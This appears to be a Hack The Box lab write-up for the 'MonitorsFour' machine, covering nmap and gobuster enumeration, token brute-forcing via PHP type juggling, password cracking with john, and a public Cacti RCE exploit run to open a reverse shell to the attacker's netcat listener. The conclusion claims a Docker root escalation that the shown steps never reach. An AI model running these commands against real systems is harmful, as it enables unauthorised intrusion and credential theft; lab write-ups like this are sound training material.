## Introduction

Hack The Box's ("MonitorsFour")[https://app.hackthebox.com/machines/MonitorsFour?tab=play_machine] released on 6<sup>th</sup> December 2025, 
is a Easy difficulty windows machine that focus on web application exploitation and docker misconfiguration for privilege escalation attacks, services are running on the WSL. 
The machine involves exploiting a vulnerable Cacti installation to gain initial access, followed by leveraging Docker API access to escalate privileges to root on the host system. 
It was an interesting challenge that required a combination of web application security knowledge and container security understanding.

### Reconnaissance

I started with an nmap scan to identify open ports and services running on the target machine.

```bash
nmap -A <target-ip>
```

The scan revealed the following open ports and services:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Running (JUST GUESSING): Microsoft Windows 2022|2012 (87%)

```

This scan indicates a web server running on port 80 and a Microsoft HTTPAPI service on port 5985, and a redirect from HTTP to http://monitorsfour.htb/. 
Also revealed that the target is likely running a version of Microsoft Windows Server.

Now that I have the initial information about the target machine, I can proceed with further enumeration and exploitation steps. 
But first we need to add the target domain to our /etc/hosts file.

```bash
echo "<target-ip> monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

I started by visiting the web server at http://monitorsfour.htb/ in my browser, which redirected me to a login page with a form to enter credentials,
 I tried sql injection, commonly used paraphrase but found nothing. I used **gobuster** to enumerate directories and files on the web server.

```bash
gobuster dir -u http://monitorsfour.htb/ -w <path-to-wordlist>
```
Revealed the following interesting directories:

```
/.env                 (Status: 200) [Size: 97]
/.htaccess            (Status: 403) [Size: 146]
/.hta                 (Status: 403) [Size: 146]
/.htpasswd            (Status: 403) [Size: 146]
/contact              (Status: 200) [Size: 367]
/controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
/forgot-password      (Status: 200) [Size: 3099]
/login                (Status: 200) [Size: 4340]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
/user                 (Status: 200) [Size: 35]
/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
```

I checked the __.env__ file, which contained sensitive information such as database credentials and secret keys.
Next , I explored the contact page which was nothing but showing error message that paths are not configured properly in the backend.
I also checked the forgot-password page, which allowed to reset the password for the user by providing the email address. 
But I didn't have any valid email addresses to test with. I also checked for any sql injection vulnerabilities on the page but found none.
Next, I deceided to check the user page which retured a json response:

```json
{"error":"Missing token parameter"}
```

This indicated that the page required a token parameter to access the user information. I tried to brute-force the token using **wfuzz**:
```bash
wfuzz -c -z file,<path-to-wordlist> --hc 404 "http://monitorsfour.htb/user?token=FUZZ"
```

This revealed a loose token validation vulnerability which allow to get me user information like email, username, password hash etc.

```
curl -s "http://monitorsfour.htb/user?token=<token-value>"
```

If you want to know more about the <a href="https://secops.group/php-type-juggling-simplified/" target="_blank" rel="noopener noreferrer">PHP type juggling</a>.

Also I conducted a subdomain enumeration using **ffuf** to find any hidden subdomains:

```bash
ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w <path-to-wordlist> -fw 3
```

and found cacti.monitorsfour.htb as a subdomain. After adding it to /etc/hosts file, I visited the subdomain in my browser and found a Cacti installation version 1.2.28. 
I tried to login using default credentials but was unsuccessful. 


### Exploitation

Now that I have user information, I can proceed with exploiting the machine. I used the password hash obtained from the user information to crack the password using **john**.

```bash
john --wordlist=<path-to-wordlist> <hash-file>
```

This revealed the password for the user.

```
password: w***********
```

With the credentials in hand, I attempted to log in to the web application at http://monitorsfour.htb/login using the username "admin" and the cracked password. 
Upon successful login, I gained access to the admin dashboard of the web application where I found nothing interesting only that it allowed to create API keys which might be useful later.
Next, I tried to access through **evil-winrm** using the cracked credentials to gain a shell on the target machine.

```bash
evil-winrm -i <target-ip> -u admin -p 'w***********'
```

This did not grant me access, I also tried to access with other credentials but was unsuccessful. Therefore, I decided to explore the Cacti installation on the subdomain cacti.monitorsfour.htb.
Which showed a login page, now I have credentials which I didn't possessed previously. While the username was "admin", it resulted in an unsuccessful attempt, 
then I used different combinations of usernames and passwords until I successfully logged in with the following credentials:

```
user: marcus (admin's real name)
password: w***********
```

Now that I had access to the Cacti dashboard, I explored the application for potential vulnerabilities. I discovered that the Cacti version 1.2.28 was vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability [(CVE-2025-66399)](https://github.com/Cacti/cacti/security/advisories/GHSA-c7rr-2h93-7gjf). 
I exploited this vulnerability to gain a [(reverse shell)](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py) on the target machine.    

```bash
python3 exploit.py --url http://cacti.monitorsfour.htb/ -u marcus -p 'w***********' -i <your-ip> -l 4444 -url http://cacti.monitorsfour.htb/
``` 

on another terminal, I set up a netcat listener to catch the reverse shell:

```bash
nc -lvnp 4444
```

This granted me a shell on the target machine as the user "marcus".

Then I checked the system information to confirm my access:

```bash
$ uname -a
Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls /home/marcus
user.txt
```

user.txt found in /home/marcus directory, I read the file to obtain the user flag.

```bash
$ cat /home/marcus/user.txt
<user-flag>
```

On the target machine, I explored the file system for privelage escalation vectors, but found nothing then I noticed that the hostname was a bit unusual "821fbd6a43fa",
 which suggested that the machine is running inside a containerised enviornment.
I checked for the network interfaces to confirm my suspicion:

```bash
$ ip a
```

The presence of eth0@if7 strongly indicates this is inside a Docker container with an IP address of 172.18.0.3.

## Conclusion

In this write-up, I demonstrated how I exploited the monitorsfour machine on Hack The Box. Starting with reconnaissance using nmap and gobuster, I identified vulnerabilities in a Cacti installation that allowed me to gain a foothold on the machine. From there, I explored the Docker environment and leveraged access to the Docker daemon to escalate my privileges to root on the host system. This challenge highlighted the importance of thorough enumeration and understanding container security in modern environments.
